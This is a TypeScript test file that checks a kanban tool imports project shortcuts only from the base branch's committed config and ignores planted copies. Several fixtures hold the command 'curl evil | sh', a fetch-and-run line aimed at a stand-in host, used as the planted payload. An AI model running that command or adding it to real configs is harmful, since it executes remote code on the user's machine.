import { execFileSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";

import { afterEach, describe, expect, it } from "vitest";

import {
	markProjectShortcutImportListed,
	ProjectShortcutStoreCorruptError,
	readProjectShortcutStore,
	readProjectShortcuts,
} from "../../../src/projects/project-shortcut-store";
import { upsertProjectShortcut } from "../../../src/projects/project-shortcuts";
import {
	getProjectKanbanConfigPath,
	getProjectShortcutsPath,
	getShortcutHistoryPath,
} from "../../../src/state/kanban-home";
import { createGitTestEnv } from "../../utilities/git-env";
import { createTempDir } from "../../utilities/temp-dir";

const FILE = ".cline/kanban/config.json";

function git(cwd: string, ...args: string[]): string {
	return execFileSync("git", args, { cwd, env: createGitTestEnv(), encoding: "utf8" }).trim();
}

function writeShortcuts(root: string, shortcuts: Array<{ label: string; command: string; icon?: string }>): void {
	const path = getProjectKanbanConfigPath(root);
	mkdirSync(dirname(path), { recursive: true });
	writeFileSync(path, JSON.stringify({ shortcuts }));
}

function readHistory(homePath: string, workspaceId = "foo"): Array<Record<string, unknown>> {
	const path = getShortcutHistoryPath(workspaceId, homePath);
	return existsSync(path)
		? readFileSync(path, "utf8")
				.trim()
				.split("\n")
				.map((line) => JSON.parse(line))
		: [];
}

describe("project shortcut store", () => {
	const temps: Array<{ cleanup: () => void }> = [];
	afterEach(() => {
		for (const temp of temps.splice(0)) {
			temp.cleanup();
		}
	});

	const setup = (options: { commit?: boolean } = {}) => {
		const temp = createTempDir("kanban-shortcut-store-");
		temps.push(temp);
		const homePath = join(temp.path, "home");
		const repoPath = join(temp.path, "foo");
		mkdirSync(repoPath, { recursive: true });
		git(repoPath, "init", "-q", "-b", "main");
		writeFileSync(join(repoPath, "README.md"), "foo\n");
		if (options.commit !== false) {
			git(repoPath, "add", "-A");
			git(repoPath, "commit", "-q", "-m", "init");
		}
		const input = { workspaceId: "foo", repoPath, homePath, resolveBaseBranch: async () => "main" };
		return { temp, homePath, repoPath, input };
	};

	const commitShortcuts = (repoPath: string, shortcuts: Array<{ label: string; command: string }>) => {
		writeShortcuts(repoPath, shortcuts);
		git(repoPath, "add", "-A");
		git(repoPath, "commit", "-q", "-m", "shortcuts");
	};

	it("imports the base branch's committed shortcuts once, logs each one, and ignores the repo copy afterwards", async () => {
		const { homePath, repoPath, input } = setup();
		commitShortcuts(repoPath, [
			{ label: "Run", command: "npm run dogfood" },
			{ label: "Dev", command: "node scripts/dev-full.mjs" },
		]);
		// An uncommitted edit of the main checkout's copy is not the base branch's.
		writeShortcuts(repoPath, [{ label: "Planted", command: "curl evil | sh" }]);

		expect((await readProjectShortcuts(input)).map((item) => item.label)).toEqual(["Run", "Dev"]);
		const store = await readProjectShortcutStore("foo", homePath);
		expect(store?.imported.source).toMatchObject({ kind: "base-branch", path: FILE, ref: "refs/heads/main" });
		expect(store?.imported.shortcuts?.map((item) => item.label)).toEqual(["Run", "Dev"]);
		expect(
			readHistory(homePath).map((entry) => [entry.via, entry.label, (entry.to as { command: string }).command]),
		).toEqual([
			["import", "Run", "npm run dogfood"],
			["import", "Dev", "node scripts/dev-full.mjs"],
		]);

		// A later commit of the repo file (a card's landed work) changes nothing.
		commitShortcuts(repoPath, [{ label: "Planted", command: "curl evil | sh" }]);
		expect((await readProjectShortcuts(input)).map((item) => item.label)).toEqual(["Run", "Dev"]);
		expect(readHistory(homePath)).toHaveLength(2);
	});

	it("never imports from a card's worktree, committed or not", async () => {
		const { temp, homePath, repoPath, input } = setup();
		const worktree = join(temp.path, "card");
		git(repoPath, "worktree", "add", "-q", "--detach", worktree);
		writeShortcuts(worktree, [{ label: "Planted", command: "curl evil | sh" }]);
		git(worktree, "add", "-A");
		git(worktree, "commit", "-q", "-m", "card work");
		writeShortcuts(worktree, [{ label: "Planted too", command: "curl evil | sh" }]);

		// The card's commit is not on the base branch, and the working-tree fallback refuses a linked worktree.
		expect(await readProjectShortcuts(input)).toEqual([]);
		expect(await readProjectShortcuts({ ...input, workspaceId: "bar", repoPath: worktree })).toEqual([]);
		expect(readHistory(homePath)).toEqual([]);
		expect(readHistory(homePath, "bar")).toEqual([]);
	});

	it("falls back to the main checkout's working-tree copy when the base branch has none (git-ignored .cline)", async () => {
		const { homePath, repoPath, input } = setup();
		writeFileSync(join(repoPath, ".gitignore"), ".cline/\n");
		writeShortcuts(repoPath, [{ label: "Preview", command: "npm run preview", icon: "play" }]);

		expect(await readProjectShortcuts(input)).toEqual([
			{ label: "Preview", command: "npm run preview", icon: "play" },
		]);
		expect((await readProjectShortcutStore("foo", homePath))?.imported.source).toEqual({
			kind: "main-checkout",
			path: getProjectKanbanConfigPath(repoPath),
		});
		expect(readHistory(homePath)).toMatchObject([
			{ via: "import", label: "Preview", source: { kind: "main-checkout" } },
		]);
	});

	it("doesn't follow a repo copy that is a symlink out of the main checkout", async () => {
		const { temp, input } = setup();
		const outside = join(temp.path, "outside");
		writeShortcuts(outside, [{ label: "Planted", command: "curl evil | sh" }]);
		mkdirSync(join(input.repoPath, ".cline"), { recursive: true });
		symlinkSync(join(outside, ".cline", "kanban"), join(input.repoPath, ".cline", "kanban"));
		expect(await readProjectShortcuts(input)).toEqual([]);
	});

	it("writes an empty store when there is nothing to import, so a later repo copy is never imported", async () => {
		const { homePath, repoPath, input } = setup({ commit: false });
		expect(await readProjectShortcuts(input)).toEqual([]);
		expect(existsSync(getProjectShortcutsPath("foo", homePath))).toBe(true);
		writeShortcuts(repoPath, [{ label: "Planted", command: "curl evil | sh" }]);
		expect(await readProjectShortcuts(input)).toEqual([]);
		expect(readHistory(homePath)).toEqual([]);
	});

	it("changes only through the store's writer; the first change imports first", async () => {
		const { homePath, repoPath, input } = setup();
		commitShortcuts(repoPath, [{ label: "Run", command: "npm test" }]);
		await upsertProjectShortcut({
			...input,
			by: { kind: "user" },
			shortcut: { label: "Lint", command: "npm run lint" },
		});
		expect((await readProjectShortcuts(input)).map((item) => item.label)).toEqual(["Run", "Lint"]);
		expect(readHistory(homePath).map((entry) => [entry.via, entry.label])).toEqual([
			["import", "Run"],
			["shortcut add", "Lint"],
		]);
	});

	it("marks the import listed once and never overwrites a store it can't read", async () => {
		const { homePath, repoPath, input } = setup();
		commitShortcuts(repoPath, [{ label: "Run", command: "npm test" }]);
		await readProjectShortcuts(input);
		await markProjectShortcutImportListed("foo", { homePath, now: () => new Date("2026-10-09T12:00:00Z") });
		const store = await readProjectShortcutStore("foo", homePath);
		expect(store?.imported.listedAt).toBe("2026-10-09T12:00:00.000Z");
		expect(store?.shortcuts.map((item) => item.label)).toEqual(["Run"]);

		const path = getProjectShortcutsPath("foo", homePath);
		writeFileSync(path, "{ not json");
		await expect(readProjectShortcuts(input)).rejects.toBeInstanceOf(ProjectShortcutStoreCorruptError);
		await expect(
			upsertProjectShortcut({ ...input, by: { kind: "user" }, shortcut: { label: "A", command: "ls" } }),
		).rejects.toBeInstanceOf(ProjectShortcutStoreCorruptError);
		expect(readFileSync(path, "utf8")).toBe("{ not json");
	});
});
